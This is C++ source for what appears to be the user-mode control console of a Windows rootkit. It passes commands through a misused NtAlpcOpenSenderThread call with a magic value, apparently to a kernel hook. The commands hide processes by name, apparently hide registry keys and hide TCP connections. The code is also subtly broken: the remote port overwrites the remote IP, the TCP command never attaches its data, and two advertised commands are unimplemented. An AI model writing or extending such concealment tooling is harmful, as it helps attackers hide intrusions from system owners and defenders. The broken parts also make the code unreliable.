#include <iostream>
#include <string>
#include <Windows.h>
#include <vector>
#include <list>

enum ComandType
{
    ComandAddRegisetryKey = 0,
    ComandAddHideProccessByName,
    ComandAddHideProccessByPID,
    ComandAddTcp,
    ComandChangeFileName
};

#define IP_ADDR(a,b,c,d) ((d << 24) + (c << 16) + (b << 8) + a)

struct BasicStruct
{
    ComandType comandType;
    PVOID comandClass;
};

struct SubKey
{
    PWCHAR subKeyName;
    ULONG subKeyNameLength;
};

struct RegKey
{
    PWCHAR registryName;
    ULONG registryLength;
};

struct RegisterClass_
{
    SubKey subKey;
    RegKey regKey;
};

struct TcpClass
{
    ULONG localIP;
    USHORT localPort;
    ULONG remoteIP;
    USHORT remotePort;
};

struct ProcessPID
{
    DWORD PID;
};

struct ProcessName
{
    PWCHAR name;
};

typedef NTSTATUS(*NT_ALPC_OPEN_SENDER_THREAD)(
    OUT PHANDLE ThreadHandle,
    IN HANDLE PortHandle,
    IN PVOID PortMessage,
    IN ULONG Flags,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes
    );

int main()
{
    std::cout << "Use --help to get instructuion list\n";

    auto ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll)
    {
        return 0;
    }

    auto NtAlpcOpenSenderThread = reinterpret_cast<NT_ALPC_OPEN_SENDER_THREAD>(GetProcAddress(ntdll, "NtAlpcOpenSenderThread"));

    while (true)
    {
        std::string comand;
        std::cout << "Write your comand\n";
        std::cin >> comand;

        if (comand == "--help")
        {
            std::cout << "--ARK - Add Registery Key\n";
            std::cout << "--HPBN - Hide Proccess By Name\n";
            std::cout << "--HPBPID - Hide Proccess By PID\n";
            std::cout << "--AT - Add Tcp\n";
            std::cout << "--CFN - Change File Name\n";
        }

        if (comand == "--ARK")
        {
            std::cout << "Write Registery key\n";            
            std::wstring rkeyW;
            std::wcin >> rkeyW;

            std::cout << "Write subkey\n";

            std::wstring srkeyW;
            std::wcin >> srkeyW;
            
            BasicStruct bs;
            bs.comandType = ComandAddRegisetryKey;

            RegisterClass_ rc;
            rc.regKey.registryLength = (rkeyW.size())*2;
            rc.regKey.registryName = (PWCHAR)rkeyW.c_str();

            rc.subKey.subKeyNameLength = (srkeyW.size())*2;
            rc.subKey.subKeyName = (PWCHAR)srkeyW.c_str();
            bs.comandClass = &rc;

            auto status = NtAlpcOpenSenderThread((PHANDLE)&bs, 0, 0, 0, 0, (PVOID)1234);

            if (status != 0)
            {
                std::cout << "smth wrong\n";
            }
        }
        if (comand == "--HPBN")
        {
            std::cout << "Write process name\n";
            std::wstring processName;
            std::wcin >> processName;

            BasicStruct bs;
            bs.comandType = ComandAddHideProccessByName;
            ProcessName pn{ (PWCHAR)processName.c_str() };
            bs.comandClass = &pn;

            auto status = NtAlpcOpenSenderThread((PHANDLE)&bs, 0, 0, 0, 0, (PVOID)1234);
            if (status != 0)
            {
                std::cout << "smth wrong\n";
            }
        }
        if (comand == "--AT")
        {
            BasicStruct bs;
            bs.comandType = ComandAddTcp;
            TcpClass tc;

            std::cout << "write local ip\n";
            int ip1, ip2, ip3, ip4;
            std::cin >> ip1 >> ip2 >> ip3 >> ip4;

            std::cout << "write local port\n";
            std::cin >>  tc.localPort;
            tc.localIP = IP_ADDR(ip1, ip2, ip3, ip4);

            std::cout << "write remote ip\n";            
            std::cin >> ip1 >> ip2 >> ip3 >> ip4;

            std::cout << "write remote port\n";
            std::cin >> tc.remoteIP;
            tc.remoteIP = IP_ADDR(ip1, ip2, ip3, ip4);

            auto status = NtAlpcOpenSenderThread((PHANDLE)&bs, 0, 0, 0, 0, (PVOID)1234);
            if (status != 0)
            {
                std::cout << "smth wrong\n";
            }
            
        }

        std::vector<int> a;
        std::list<int> s;
        s.size();

    }
}
